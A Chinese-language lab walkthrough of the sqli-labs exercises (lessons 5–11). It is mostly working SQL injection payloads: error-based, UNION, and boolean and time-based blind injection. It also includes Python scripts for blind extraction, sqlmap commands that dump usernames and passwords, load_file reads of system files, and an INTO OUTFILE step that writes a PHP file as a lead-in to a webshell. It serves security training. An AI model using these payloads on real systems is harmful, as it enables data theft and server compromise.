<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1' union select 1,count(*),concat((select database()),floor(rand()<span class="number">*2</span>)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a--+</span><br><span class="line">或者</span><br><span class="line">?<span class="attribute">id</span>=-1' union select 1,count(*),concat((select database()),floor(rand(0)<span class="number">*2</span>))as a <span class="keyword">from</span> information_schema.columns<span class="built_in"> group </span>by a%23</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/510.gif" alt="clipboard.png"></p>
<p>查询表名–通过联合查询</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1' union select 1,count(*),concat((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>),floor(rand()*2)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a--+</span><br><span class="line">或者</span><br><span class="line">?<span class="attribute">id</span>=-1' union select 1,count(*),concat((select table_name <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_name</span>=<span class="string">'users'</span> limit 0,1),floor(rand(0)<span class="number">*2</span>))as a <span class="keyword">from</span> information_schema.columns<span class="built_in"> group </span>by a%23</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/511.gif" alt="clipboard.png"></p>
<p>查询列名</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1' union select 1,count(*),concat((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>),floor(rand()*2)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a--+</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=-1' union select 1,count(*),concat((select column_name <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span> limit 0,1),floor(rand(0)<span class="number">*2</span>))as a <span class="keyword">from</span> information_schema.columns<span class="built_in"> group </span>by a%23</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/512.gif" alt="clipboard.png"></p>
<p>查数据</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1' union select 1,count(*),concat((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),floor(rand()<span class="number">*2</span>)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/513.gif" alt="clipboard.png"></p>
<p> 其他payload（由于是随机爆出来，所可以以多试几次）</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>通过联合查询，得出数据库名</span><br><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(*),concat_ws('-',(<span class="keyword">select</span> database()),<span class="built_in">floor</span>(<span class="built_in">rand</span>()*<span class="number">2</span>)) as a <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> a--+ </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>通过group_concat()函数将查到的表名连接并返回报错，得出表名</span><br><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(*),concat_ws('-',(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema='security'),<span class="built_in">floor</span>(<span class="built_in">rand</span>()*<span class="number">2</span>)) as a <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> a--+</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>得出字段名</span><br><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(*),concat_ws('-',(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_name='users'),<span class="built_in">floor</span>(<span class="built_in">rand</span>()*<span class="number">2</span>)) as a <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> a--+</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>最后是用户信息，因为这里只能查询一行，所以不能用group_concat()，可以修改limit的范围来遍历用户信息。</span><br><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(*),concat_ws('-',(<span class="keyword">select</span> concat_ws('-',id,username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(<span class="built_in">rand</span>()*<span class="number">2</span>)) as a <span class="keyword">from</span> information_schema.columns <span class="built_in">group</span> <span class="keyword">by</span> a--+</span><br></pre></td></tr></table></figure>

<h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1><p>输入id=1  正常无回显<br>输入id=1’  正常无回显</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/61.gif" alt="clipboard.png"><br>输入id=1”  错误</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/62.gif" alt="clipboard.png"><br>输入id=1”–+ 正常无回显</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/63.gif" alt="clipboard.png"><br>接下来与less-5一样，用双查询注入<br>使用order by查询字段<br>?id=1”order by 3–+</p>
<p>查出有三个字段</p>
<p>报数据库：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1" union select 1,count(*),concat((select database()),floor(rand()<span class="number">*2</span>)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a--+</span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=-1" union select 1,count(*),concat((select database()),floor(rand(0)<span class="number">*2</span>))as a <span class="keyword">from</span> information_schema.columns<span class="built_in"> group </span>by a%23</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/64.gif" alt="clipboard.png"></p>
<p>爆表明：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1" union select 1,count(*),concat((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>),floor(rand()*2)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a--+</span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=-1" union select 1,count(*),concat((select table_name <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_name</span>=<span class="string">'users'</span> limit 0,1),floor(rand(0)<span class="number">*2</span>))as a <span class="keyword">from</span> information_schema.columns<span class="built_in"> group </span>by a%23</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/65.gif" alt="clipboard.png"></p>
<p>爆列名</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1" union select 1,count(*),concat((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>),floor(rand()*2)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/66.gif" alt="clipboard.png"></p>
<p>爆数据</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1" union select 1,count(*),concat((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),floor(rand()<span class="number">*2</span>)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/67.gif" alt="clipboard.png"></p>
<h1 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h1><p>【导出文件GET字符型注】</p>
<p>当我们输入id=1时正常无回显，并提示我们要使用文件操作</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/71.gif" alt="clipboard.png"></p>
<p>id=1与id=1”均未报错</p>
<p>id=1’时报错无回显</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/72.gif" alt="clipboard.png"></p>
<p>所以确定是字符型注入</p>
<p>接下来开始闭合</p>
<p>id=1’–+  报错</p>
<p>分析是否有括号<br>?id=1’ and 1=1–+<br>将查询语句后半段注释掉发现仍报错，说明有括号。依次增加括号个数，直到回显正常</p>
<p>id=1’)–+<br>id=1’))–+<br>发现第二种情况未报错，成功闭合单引号</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/73.gif" alt="clipboard.png"></p>
<p>接下来要了解一些关于文件的相关操作</p>
<table>
<thead>
<tr>
<th></th>
<th>load_file(file_name);读取文件并返回该文件的内容作为一个字符串。</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>使用的条件</p>
<p>A.必须有权限读取并且文件可读and (select count(*) from mysql.user)&gt;0*如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。</p>
<p>B.欲读取文件必须在服务器上。<br>C.必须指定文件完整的路径<br>D.欲读取文件必须小于max_allowed_packet</p>
<p>实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决：<br>1.绝对物理路径<br>2.构造有效的畸形语句(报错爆出绝对路径)<br>实例：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,hex(replace(load_file(char(<span class="number">99</span>,<span class="number">58</span>,<span class="number">92</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">92</span>,<span class="number">115</span>,<span class="number">97</span>,<span class="number">109</span>))))</span><br></pre></td></tr></table></figure>

<p>利用hex()将文件导出来，特别是smb文件</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,load_file(char(<span class="number">99</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>))</span><br></pre></td></tr></table></figure>

<p>注意：c:/boot.ini的十六进制是0x633s2f626f6f742e696e69</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,1,1,<span class="title">load_file</span>(<span class="title">C</span>:\\<span class="title">boot</span>.<span class="title">ini</span>)</span></span><br></pre></td></tr></table></figure>

<p>注意：路径里的/用\代替</p>
<p> SELECT INTO OUTFILE ‘file_name’,导入到文件中，file_name 不能是一个已经存在的文件。  </p>
<p>先来判断一下我们是否是最高权限</p>
<p>输入</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?id=1"))and (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> mysql.users)&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/74.gif" alt="clipboard.png"></p>
<p>正常，说明是最高权限 </p>
<p>我们在mysql中输入 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/75.gif" alt="clipboard.png"></p>
<p>发现secure_file_priv为/tmp,表示限制mysqld只能在/tmp目录中执行导入导出其他目录不能执行。</p>
<p>所以输入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'&lt;?php phpinfo( );?&gt;'</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\\phpstudy_pro\\WWW\\wamp64\\tmp\\999.php'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/76.gif" alt="clipboard.png"></p>
<p>成功在本地tmp目录下写入文件</p>
<p>然后就可以写入小马利用</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/77.gif" alt="clipboard.png"></p>
<h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>加单引号，出错，加注释<a href="http://localhost:8088/sqlilabs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost:8088/sqlilabs/Less-8/?id=1&#39;</a> –+ 正常。可知为单引号闭合。<br><img src="/2020/02/27/sqli_labs--less-1-10/81.gif" alt="clipboard.png"></p>
<p>但是没有回显，所以使用布尔型盲注或者时间盲注</p>
<p>可以直接使用sqlmap</p>
<p>sqlmap -u <a href="http://localhost:8088/sqlilabs/Less-8/?id=1" target="_blank" rel="noopener">http://localhost:8088/sqlilabs/Less-8/?id=1</a> –technique B –dbms mysql –dbs –batch –threads 10 </p>
<p>时间盲注payload :</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">先查看数据库的长度?<span class="built_in">id</span>=<span class="number">1</span>'<span class="keyword">and</span> <span class="keyword">if</span>(<span class="built_in">length</span>(database())=<span class="number">8</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">--+为8</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/82.gif" alt="clipboard.png"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%<span class="number">27</span><span class="keyword">and</span>%<span class="number">20</span><span class="keyword">if</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+ 第一个字符为s</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/83.gif" alt="clipboard.png"></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>'and if(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+第二个字符为e</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/84.gif" alt="clipboard.png"></p>
<p>以此类推数据库名为security</p>
<p>直接用脚本爆表名import requests</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">maxlength = <span class="number">50</span></span><br><span class="line">host = <span class="string">'http://127.0.0.1/sql/Less-8/?'</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, maxlength):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"id=1\' and if(ascii(substring((select table_name from information_schema.tables where table_schema = 'security' limit 0,1),&#123;0&#125;,1)) =&#123;1&#125;,sleep(5),null)--+"</span></span><br><span class="line">        url = (host + payload.format(i,x))</span><br><span class="line">        print(url)</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">4</span>:</span><br><span class="line">            flag += chr(x)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到第一个为emails</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/85.gif" alt="clipboard.png"></p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/86.gif" alt="clipboard.png"></p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/87.gif" alt="clipboard.png"></p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/88.gif" alt="clipboard.png"></p>
<p>暴列名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">maxlength = <span class="number">50</span></span><br><span class="line">host = <span class="string">'http://127.0.0.1/sql/Less-8/?'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, maxlength):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"id=1\' and if(ascii(substring((select table_name from information_schema.tables where table_schema = 'users' limit 0,1),&#123;0&#125;,1)) =&#123;1&#125;,sleep(5),null)--+"</span></span><br><span class="line">        url = (host + payload.format(i,x))</span><br><span class="line">        print(url)</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">4</span>:</span><br><span class="line">            flag += chr(x)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/89.gif" alt="clipboard.png"></p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/810.gif" alt="clipboard.png"></p>
<p>爆数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">maxlength = <span class="number">50</span></span><br><span class="line">chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&lt;&gt;,.;:'</span><span class="string">"[]&#123;&#125;\|+=_-)(~`"</span></span><br><span class="line">host = <span class="string">'http://127.0.0.1/sql/Less-8/?'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">22</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> chars:</span><br><span class="line">        payload = <span class="string">"id=1\' and if(ascii(substr((select username from users limit 0,1),&#123;0&#125;,1)) =&#123;1&#125;,sleep(5),null)--+"</span></span><br><span class="line">        d = ord(x)</span><br><span class="line">        url = (host + payload.format(i,d))</span><br><span class="line">        print(url)</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">4</span>:</span><br><span class="line">            flag += x</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<p><img src="/2020/02/27/sqli_labs--less-1-10/811.gif" alt="clipboard.png"></p>
<p>很多，就不一个一个爆了</p>
<p>布尔盲注payload：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="symbol">'and</span> left((<span class="keyword">select</span> database()),<span class="number">1</span>)=<span class="string">'s'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>(时间型盲注)</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">经过测试发现，当我们输入</span><br><span class="line">id=1</span><br><span class="line">id=1'</span><br><span class="line">id=1“</span><br><span class="line">时均没有反应</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/91.gif" alt="clipboard.png"></p>
<p>所以不能根据页面的回显来判断匹配结果，要使用延时函数sleep()对两种输入进行区分。</p>
<p>尝试使用单引号闭合</p>
<p>?id=1’and sleep(5)–+  有延时</p>
<p><img src="/2020/02/27/sqli_labs--less-1-10/92.gif" alt="clipboard.png"></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id=<span class="number">1</span>'and if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">爆表</span><br><span class="line">?id=<span class="number">1</span>'and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">爆列</span><br><span class="line">?id=<span class="number">1</span>'and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+ </span><br><span class="line">爆内容</span><br><span class="line">?id=<span class="number">1</span>'and if(ascii(substr((select username from users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br></pre></td></tr></table></figure>



<p>我们可以使用less-8的脚本来注入，也可以使用sqlmap，这里我们使用sqlmap</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//116.62.104.172</span><span class="function">:81</span>/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p>爆数据库名：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//116.62.104.172</span><span class="function">:81</span>/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/93.gif" alt="clipboard.png"></p>
<p>爆表名：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//116.62.104.172</span><span class="function">:81</span>/Less-9/?id=1<span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security <span class="params">--tables</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/94.gif" alt="clipboard.png"></p>
<p>爆列名：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//116.62.104.172</span><span class="function">:81</span>/Less-9/?id=1<span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security -T users <span class="params">--column</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/95.gif" alt="clipboard.png"></p>
<p>爆内容：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//116.62.104.172</span><span class="function">:81</span>/Less-9/?id=1<span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security -T users -C username,password <span class="params">--dump</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/96.gif" alt="clipboard.png"></p>
<h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><p>(双引号时间盲注)</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">与第九关一样当我们输入</span><br><span class="line"><span class="attribute">id</span>=1</span><br><span class="line"><span class="attribute">id</span>=1'</span><br><span class="line"><span class="attribute">id</span>=1“</span><br><span class="line">时均没有反应,所以应该是盲注</span><br><span class="line">尝试使用单引号闭合</span><br><span class="line">?<span class="attribute">id</span>=1'and sleep(5)--+  无延时</span><br><span class="line">尝试使用双引号闭合</span><br><span class="line">?<span class="attribute">id</span>=1"and sleep(5)--+  有延时</span><br></pre></td></tr></table></figure>



<p><img src="/2020/02/27/sqli_labs--less-1-10/101.gif" alt="clipboard.png"></p>
<p>爆库</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1"and <span class="keyword">if</span>(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1"and if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>爆列</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1"and if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p> 爆内容</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1"and <span class="keyword">if</span>(ascii(substr((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),1,1))=68,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

<p> 这里我们使用sqlmap跑</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://116.62.104.172:81/Less-10/?id=1%22"</span> <span class="params">--technique</span> T <span class="params">--dbms</span> mysql <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p> 爆数据库名：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://116.62.104.172:81/Less-10/?id=1%22"</span> <span class="params">--technique</span> T <span class="params">--dbms</span> mysql <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/102.gif" alt="clipboard.png"></p>
<p>爆表名：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://116.62.104.172:81/Less-10/?id=1%22"</span><span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security <span class="params">--tables</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/103.gif" alt="clipboard.png"></p>
<p>爆列名：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://116.62.104.172:81/Less-10/?id=1%22"</span> --technique T --dbms mysql -D security -T<span class="built_in"> users </span>--column --batch</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/104.gif" alt="clipboard.png"></p>
<p>爆内容：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://116.62.104.172:81/Less-10/?id=1%22"</span> --technique T --dbms mysql -D security -T<span class="built_in"> users </span>-C username,password --dump --batch</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/105.gif" alt="clipboard.png"></p>
<h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><p>进入之后发现为登录框，并且提交方式为post。<br><img src="/2020/02/27/sqli_labs--less-1-10/1.png" alt><br>经过简单测试发现注入点在passwd<br>输入1’错误，闭合后显示正常<br><img src="/2020/02/27/sqli_labs--less-1-10/2.png" alt><br>接下来就是一系列的联合注入</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">利用<span class="keyword">order</span> <span class="title">by</span>判断字段数</span><br><span class="line"><span class="attr">uname=</span><span class="number">1</span>&amp;<span class="attr">passwd=</span><span class="number">1</span>%<span class="number">27</span> <span class="keyword">order</span> <span class="title">by</span> <span class="number">2</span>--+不报错</span><br><span class="line"><span class="attr">uname=</span><span class="number">1</span>&amp;<span class="attr">passwd=</span><span class="number">1</span>%<span class="number">27</span> <span class="keyword">order</span> <span class="title">by</span> <span class="number">2</span>--+报错，说明有两个字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/3.png" alt><br><strong>爆库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname=1&amp;passwd=-1' union <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">--+`</span></span><br></pre></td></tr></table></figure>

<p><strong>爆表</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">uname</span>=1&amp;passwd=1' union select 1,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>--+</span><br></pre></td></tr></table></figure>

<p><strong>爆列名</strong></p>
